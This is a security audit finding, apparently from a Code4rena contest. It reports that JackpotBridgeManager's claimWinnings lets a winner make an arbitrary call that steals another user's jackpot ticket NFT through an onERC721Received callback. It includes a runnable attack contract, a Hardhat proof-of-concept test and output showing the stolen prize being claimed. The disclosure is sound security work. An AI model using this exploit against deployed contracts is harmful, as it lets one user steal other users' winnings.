# Winner of the jackpot can steal the ticket (NFT) owned by JackpotBridgeManager

### Severity: High

### Line of Code

https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/JackpotBridgeManager.sol#L225

### Summary

The `claimWinnings` function in the `JackpotBridgeManager.sol` calls `bridgeFunds`, which allows to calls an arbitrary address with arbitrary data. Despite the balance check in bridgeFunds which seems to force this call to be the usdc transfer, however, it is possible to complete this transfer and at the same time, steal a NFT jackpot ticket owned by `JackpotBridgeManager`. 

### Clarification

I want to clarify that although this issue seems to be mentioned in Zellic audit report Megapot V2 page 16-17

```
Zellic audit report

This issue was remediated in commit 642a64a8 ↗ by ensuring that claim amount cannot be 0.
However, this remediation may be partial. While it prevents allowance stealing in the vast majority
of tokens, there remain edge cases where arbitrary calls could still be exploited. For example, a
token with an exposed multicall function could potentially allow an attacker to:

1. First invoke a function that moves USDC from the JackpotBridgeManager to satisfy the
balance check
2. Then invoke a function to steal any granted allowances from that token
Such an exploit would require specific conditions:
• A token with external allowances granted to the JackpotBridgeManager
• The same token having sufficient logic complexity (like multicall) to bypass USDC
balance checks while stealing allowances
• The attacker having a winning ticket to trigger the bridge function
While no popular ERC20 tokens with these characteristics were immediately identified, the
possibility of such tokens existing or being created in the future represents a residual risk.
Consider implementing additional safeguards such as a whitelist for _bridgeDetails.to
addresses to fully eliminate arbitrary call risks.
```

**However, the auditors do not to realize the possibility of directly stealing the NFT ticket owned by the JackpotBridgeManager. (Because users buy tickets through the BridgeManager, the BridgeManager holds the tickets before claiming), which is an immediate threat, the balance check in the `_bridgeFunds` does not prevent this attack due to a subtle callback function inside the solady/ERC721 `safetransferfrom`.**  

### Finding Description

The attacker can be anyone who uses JackpotBridgeManager to buy a ticket and wins. Here the attack logic:

Step1. Deploy a malicious contract that implements a callback function `onERC721Received(address from,address to, uint256 id, bytes data)`, inside this callback function, do `usdc.transfer(JackpotBridgeManager, address(this), amount)`. We can calculate the amount manually through `GuaranteedMinimumPayoutCalculator.getTierPayout` and `JackPot.getTicketTierIds` to pass the balance check in the `_bridgeFunds` 

Step2. The attacker calls `claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature)` with ticketId to be the winning ticket, and _bridgeDetails to be 

```
   struct RelayTxData {
        address approveTo = attacker's contract
        address to = JackpotTicketNFT
        bytes data = abi.encodeWithSignature("safeTransferFrom(address,address,uint256,bytes)", JackpotTicketNFT, attacker's contract, ticketId, claimAmountdata)
    }
```

### Impact

A ticket winner can steal a jackpot ticket owned by BridegeManager in any round, and possibly a targeted ticket that wins a big prize.

### Recommended Mitigation

I don't have a perfect solution. As mentioned in the Zellic's report, one possible way of mitigation is to provide a whitelist check of `_bridgeDetails.to`.

### PoC Preview

In the provided PoC, buyerOne and buyerTwo both buy a ticket through the BridgeManager. buyerOne wins in tier 4, while buyerTwo wins in tier 11. We will demonstrate how buyerOne can claim his own small prize and simultaneously steal buyerTwo’s large prize by including a malicious payload in the `claimWinnings` function of `JackpotBridgeManager.sol`. The attack requires no specific conditions or constraints.

### PoC

To run the PoC

Step 1. Put the follwing attack contract in `contracts/mocks/AttackMock.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "hardhat/console.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {JackpotTicketNFT} from "../JackpotTicketNFT.sol";
contract AttackMock {

    IERC20 public usdc;
    JackpotTicketNFT nft;
    address owner;
    uint256 amount;
    

    constructor(IERC20 _usdc, JackpotTicketNFT _nft) {
            usdc = _usdc;
            owner = msg.sender;
            nft = _nft;
    }
    
    function onERC721Received(address operator, address from, uint256 _id, bytes memory data) external returns(bytes4) {
        amount = abi.decode(data, (uint256));
        usdc.transferFrom(from, address(this), amount);
        return 0x150b7a02;
    }

    function transferNFT(uint256 id) external {
        nft.transferFrom(address(this), owner, id);
    } 
}
```

Step 2. Put the following content in `test/poc/C4PoC.spec.ts` and run `yarn test:poc`

```solidity
import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import { PRECISE_UNIT } from "@utils/constants";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProviderMock,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProviderMock;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;
    entropyProvider = jackpotSystem.entropyProvider;

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC", async () => {
    it("demonstrates the C4 submission's validity", async () => {
      
      // buyerOne: evil
      // buyerTwo: victim

      // buyerOne starts with no USDC due to a mismatch between the getAccounts output ordering in this file and in jackPotFixture.ts. 
      // This isn’t important, but we still need to give buyerOne some USDC first.
      await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(1));

      console.log("The amount of usdc that buyerOne starts with", await usdcMock.balanceOf(buyerOne.address));
      
      // buyerOne deploys the malicious contract, which has a callback function onERC721Received.
      const attackMock = await ethers.getContractFactory("AttackMock"); 
      const attackMockDeployed = await attackMock.connect(buyerOne.wallet).deploy(usdcMock.getAddress(), jackpotNFT.getAddress());
      await attackMockDeployed.waitForDeployment();

      let subjectTicketIds1: bigint[];
      let subjectTicketIds2: bigint[];
      let subjectBridgeDetails: RelayTxData;
      let subjectSignature: string;
      let expectedUserWinnings: bigint;

      await usdcMock.connect(buyerOne.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));
      
      // buyerOne buys ticket1 through the bridgeManager in tier 4 (see the winning ticket below)
      const tickets1: Ticket[] = [
        { normals: [BigInt(1), BigInt(6), BigInt(3), BigInt(4), BigInt(5)], bonusball: BigInt(1) },
      ];
      const recipient1 = buyerOne.address;
      const referrers: Address[] = [];
      const referralSplitBps: bigint[] = [];
      const source = ethers.encodeBytes32String("test");
      const ticketIds1 = await jackpotBridgeManager.connect(buyerOne.wallet).buyTickets.staticCall(
        tickets1,
        recipient1,
        referrers,
        referralSplitBps,
        source
      );
      subjectTicketIds1 = [...ticketIds1];

      await jackpotBridgeManager.connect(buyerOne.wallet).buyTickets(
        tickets1,
        recipient1,
        referrers,
        referralSplitBps,
        source
      );

      // buyerTwo buys ticket2 through the bridgeManager in tier 11, which is a lot of money (see the winning ticket below)
      // We will not use this tierinfo, just want to show it is valuable. 
      const tickets2: Ticket[] = [
        { normals: [BigInt(1), BigInt(6), BigInt(7), BigInt(8), BigInt(9)], bonusball: BigInt(2) },
      ];
      const recipient2 = buyerTwo.address;

      await usdcMock.connect(buyerTwo.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));
     
      const ticketIds2 = await jackpotBridgeManager.connect(buyerTwo.wallet).buyTickets.staticCall(
        tickets2,
        recipient2,
        referrers,
        referralSplitBps,
        source
      );
      subjectTicketIds2 = [...ticketIds2];

      await jackpotBridgeManager.connect(buyerTwo.wallet).buyTickets(
        tickets2,
        recipient2,
        referrers,
        referralSplitBps,
        source
      );

      // run the jackpot when time is ready
      await time.increase(jackpotSystem.deploymentParams.drawingDurationInSeconds + BigInt(1));
      const drawingState = await jackpot.getDrawingState(1);
      await jackpot.connect(owner.wallet).runJackpot(
        { value: jackpotSystem.deploymentParams.entropyFee + ((jackpotSystem.deploymentParams.entropyBaseGasLimit + jackpotSystem.deploymentParams.entropyVariableGasLimit * drawingState.bonusballMax) * BigInt(1e7)) }
      );
      // The winning ticket 
      await entropyProvider.connect(owner.wallet).randomnessCallback([[BigInt(1), BigInt(6), BigInt(7), BigInt(8), BigInt(9)], [BigInt(2)]]);
      
      // Sidenote: in the `jackpotBridgeManager.spec` the formula used 
      // expectedUserWinnings = rawUserWinnings * (PRECISE_UNIT - jackpotSystem.deploymentParams.referralWinShare) / PRECISE_UNIT; 
      // The result might not match with the totalClaimAmount in `claimWinnings` in Jackpot.sol due to a precision loss
      // We corrected it here.

      // Get expected winning amount for ticket1
      const rawUserWinnings = (await payoutCalculator.getTierPayout(1, 4));
      expectedUserWinnings = rawUserWinnings  - (rawUserWinnings * jackpotSystem.deploymentParams.referralWinShare  / PRECISE_UNIT);

      // create the malicious bridgedetails, which calls the safeTransferFrom in the jackpotNFT
      subjectBridgeDetails = {
        approveTo: await attackMockDeployed.getAddress(),
        to: await jackpotNFT.getAddress(),
        data: jackpotNFT.interface.encodeFunctionData("safeTransferFrom(address,address,uint256,bytes)", [
          await jackpotBridgeManager.getAddress(),
          await attackMockDeployed.getAddress(),
          ticketIds2[0],
          ethers.AbiCoder.defaultAbiCoder().encode(["uint256"],[expectedUserWinnings])
        ])
      };

      // sign it by buyerOne's private key
      subjectSignature = await generateClaimWinningsSignature(
        await jackpotBridgeManager.getAddress(),
        subjectTicketIds1,
        subjectBridgeDetails,
        buyerOne.wallet
      );
      
      // make sure ticket 2's owner is bridgeManager before the attack, and make sure the ticketowner recorded is buyerTwo
      // buyerOne shall not be able to steal this ticket
      expect(await jackpotNFT.ownerOf(ticketIds2[0])).to.eq(await jackpotBridgeManager.getAddress()); // ticket 2's owner is the bridge
      expect(await jackpotBridgeManager.ticketOwner(ticketIds2[0])).to.eq(buyerTwo.address);

      // perform the attack
      await jackpotBridgeManager.connect(buyerOne.wallet).claimWinnings(
        subjectTicketIds1,
        subjectBridgeDetails,
        subjectSignature
      );

      // ticket 2's owner becomes attacker's contract
      expect(await jackpotNFT.ownerOf(ticketIds2[0])).to.eq(await attackMockDeployed.getAddress());
      // transfer the ticket 
      await attackMockDeployed.connect(buyerOne.wallet).transferNFT(ticketIds2[0]);
      // ticket 2's owner becomes buyerOne, the exploit successes!
      expect(await jackpotNFT.ownerOf(ticketIds2[0])).to.eq(buyerOne.address); 
      console.log("The amount of usdc that buyerOne have after claiming ticket1", expectedUserWinnings);
      // buyerOne claims the ticket2 that is stolen from buyerTwo
      await jackpot.connect(buyerOne.wallet).claimWinnings(subjectTicketIds2);
      console.log("The amount of usdc that buyerOne actually after stealing and claiming ticket2", await usdcMock.balanceOf(buyerOne.address));
    });
  });
});

```

Here is the log of the output:

```
  C4
    PoC
The amount of usdc that buyerOne starts with 1000000n
The amount of usdc that buyerOne have after claiming ticket1 1227866n
The amount of usdc that buyerOne actually after stealing and claiming ticket2 166165013000n
      ✔ demonstrates the C4 submission's validity (111ms)


  1 passing (203ms)
```